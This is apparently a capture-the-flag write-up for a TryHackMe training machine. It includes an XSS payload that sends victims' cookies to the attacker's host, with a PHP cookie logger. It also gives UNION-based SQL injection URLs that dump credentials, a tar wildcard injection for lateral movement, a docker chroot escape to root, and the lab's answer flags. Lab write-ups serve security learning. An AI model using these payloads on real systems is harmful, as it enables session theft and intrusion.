# Flag 1
- Started rustnscan and scanned for ports

```console
❯ rustscan -a 10.10.171.76 --ulimit 5000 -- -sC -sV | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.171.76:22
Open 10.10.171.76:80
Open 10.10.171.76:32768
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 19:20 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
Initiating Ping Scan at 19:20
Scanning 10.10.171.76 [2 ports]
Completed Ping Scan at 19:20, 3.00s elapsed (1 total hosts)
Nmap scan report for 10.10.171.76 [host down, received no-response]
NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:20
Completed NSE at 19:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.86 seconds
```

- Checked out port 80 manually and simultaneously started a `gobuster` scan.
- Signed up and logged in as a test account.
- On checking cookie the token seems to `JWT`, decoded it from [here](https://jwt.io/)

```json
{
  "userId": 4,
  "username": "test",
  "admin": false,
  "iat": 1669816203
}
```

- Tried changing admin and as true, but no success.
- Then a found `XSS`, While creating a new listing.
- Used the following payload to initiate an alert

```html
</h1><script>alert(1)</script>
```
- Got an alert.
- We can also  grab the token for admin by `CSRF`.
- Got a php code to steal cookie from a user 

```php
<?php

	$cookie = $_GET["token"];
	$file = fopen('cookielog.txt', 'a');
	fwrite($file, $cookie . "\n\n");
?>
```

- Started http server on my machine with python under the directory with php code.
- Made a new listing with heading

```html
</h1><script>document.location= "http://10.17.0.215/cookiegrab.php?token=" + document.cookie;</script>
```

- Reported it and got the token 

```console
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.171.76 - - [30/Nov/2022 20:23:51] "GET /cookiegrab.php?token=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2Njk4MjAwMzN9.rlplmkuWntI6i1WzVsqadDxj3drI4_vPdgPY3tJwTIE HTTP/1.1" 200 -
```

- Used this cookie to access admin directory we got from gobuster

```console
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.171.76
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/30 19:30:09 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 153]
/.htaccess            (Status: 403) [Size: 153]
/.htpasswd            (Status: 403) [Size: 153]
/Admin                (Status: 403) [Size: 392]
/admin                (Status: 403) [Size: 392]
/ADMIN                (Status: 403) [Size: 392]
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 857]
/Login                (Status: 200) [Size: 857]
/messages             (Status: 302) [Size: 28] [--> /login]
/new                  (Status: 302) [Size: 28] [--> /login]
/robots.txt           (Status: 200) [Size: 31]
/signup               (Status: 200) [Size: 667]
/stylesheets          (Status: 301) [Size: 189] [--> /stylesheets/]
===============================================================
2022/11/30 19:31:20 Finished
===============================================================
```

- Got the flag

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/24.png)


# User flag
- There is SQL Injection at `http://10.10.215.244/admin?user=1`, which can be confirmed by 

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/25.png)
- Checked DBMS running by checking versions.

```console
# MySQL and MSSQL
http://10.10.215.244/admin?user=0%20UNION%20SELECT%20@@version,2,3,4%20--%20-
# For Oracle
http://10.10.215.244/admin?user=0%20UNION%20SELECT%20SELECT%20banner%20FROM%20v$version,2,3,4%20--%20-
# For SQLite
http://10.10.215.244/admin?user=0%20UNION%20SELECT%20sqlite.version(),2,3,4%20--%20-
```

- Got the DBMS as MySQL 

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/26.png)

- Retrieved databases and got information_schema and marketplace, with

```http
http://10.10.215.244/admin?user=0%20UNION%20SELECT%20group_concat(schema_name),2,3,4%20from%20information_schema.schemata%20--%20-
```

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/27.png)

- Checked tables in database `marketplace`.

```http
http://10.10.215.244/admin?user=0%20UNION%20SELECT%20group_concat(table_name),2,3,4%20FROM%20information_schema.TABLES%20WHERE%20table_schema=%27marketplace%27%20%20--%20-
```

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/28.png)

- Checked for column names under `messages` and got `id,is_read,message_content,user_from,user_to`

```http
http://10.10.215.244/admin?user=0%20UNION%20SELECT%20group_concat(column_name),2,3,4%20FROM%20information_schema.COLUMNS%20WHERE%20table_NAME=%27messages%27%20%20--%20-
```

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/29.png)

- Retrieved table with column names and got a SSH password.

```http
http://10.10.215.244/admin?user=0%20UNION%20SELECT%20group_concat(message_content,user_from,user_to),2,3,4%20FROM%20messages%20%20--%20-
```

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/30.png)


```text
Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ13,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!14,Thank you for your report. We have reviewed the listing and found nothing that violates our rules
```

- But we don't have an username, tried decoding the cookie and got an user michael

```json
{
  "userId": 2,
  "username": "michael",
  "admin": true,
  "iat": 1669890116
}
```

- Didn't work but found one more user jake on the `admin/` page and tried to login

- We are in :wink:

```console
❯ ssh jake@10.10.215.244
jake@10.10.215.244's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec  1 11:35:00 UTC 2022

  System load:                    0.07
  Usage of /:                     87.1% of 14.70GB
  Memory usage:                   29%
  Swap usage:                     0%
  Processes:                      97
  Users logged in:                0
  IP address for eth0:            10.10.215.244
  IP address for docker0:         172.17.0.1
  IP address for br-636b40a4e2d6: 172.18.0.1

  => / is using 87.1% of 14.70GB


20 packages can be updated.
0 updates are security updates.


Last login: Thu Dec  1 11:34:51 2022 from 10.17.0.215
jake@the-marketplace:~$

```

- Found user flag

```console
jake@the-marketplace:~$ ls
user.txt
jake@the-marketplace:~$ cat user.txt
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```


# Root Flag

- Checked for sudo rights and found out we can run `/opt/backups/backup.sh`

```console
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh

```

- On checking `/opt/backups/backup.sh`, found out we can't write this file but there is an asterisk while running this shell script

```console
jake@the-marketplace:/tmp$ cat /opt/backups/backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

- We can exploit it to start a shell as michael.


```console
jake@the-marketplace:/opt/backups$ vim shell.sh
jake@the-marketplace:/opt/backups$ ls
backup.sh  backup.tar  shell.sh
jake@the-marketplace:/opt/backups$ chmod +x shell.sh
jake@the-marketplace:/opt/backups$ ls
backup.sh  backup.tar  shell.sh
jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/opt/backups$ echo "" > --checkpoint=1
jake@the-marketplace:/opt/backups$ ls
 backup.sh   '--checkpoint=1'                         shell.sh
 backup.tar  '--checkpoint-action=exec=sh shell.sh'
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
Backing up files...
tar: /opt/backups/backup.tar: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
```

- It throws an error due to `backup.tar`, deleted this file and again started the script.

```console
jake@the-marketplace:/opt/backups$ ls -l backup.tar
-rw-rw-r-- 1 jake jake 10240 Aug 23  2020 backup.tar
jake@the-marketplace:/opt/backups$ rm backup.
rm: cannot remove 'backup.': No such file or directory
jake@the-marketplace:/opt/backups$ rm backup.tar
jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh
Backing up files...
michael@the-marketplace:/opt/backups$

```

- Found docker in `michael's` id 

```console
michael@the-marketplace:/$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

- Checked for images and found alpine 

```console
michael@the-marketplace:/$ docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        2 years ago         2.16GB
nginx                        latest              4bb46517cac3        2 years ago         133MB
node                         lts-buster          9c4cc2688584        2 years ago         886MB
mysql                        latest              0d64f46acfd1        2 years ago         544MB
alpine                       latest              a24bb4013296        2 years ago         5.57MB
```

- Loaded alpine to `/mnt` and started a shell

```console
michael@the-marketplace:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
#
```

- Got the root flag


```console
# bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@967c57d74bb6:/# cat /root/root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}

```
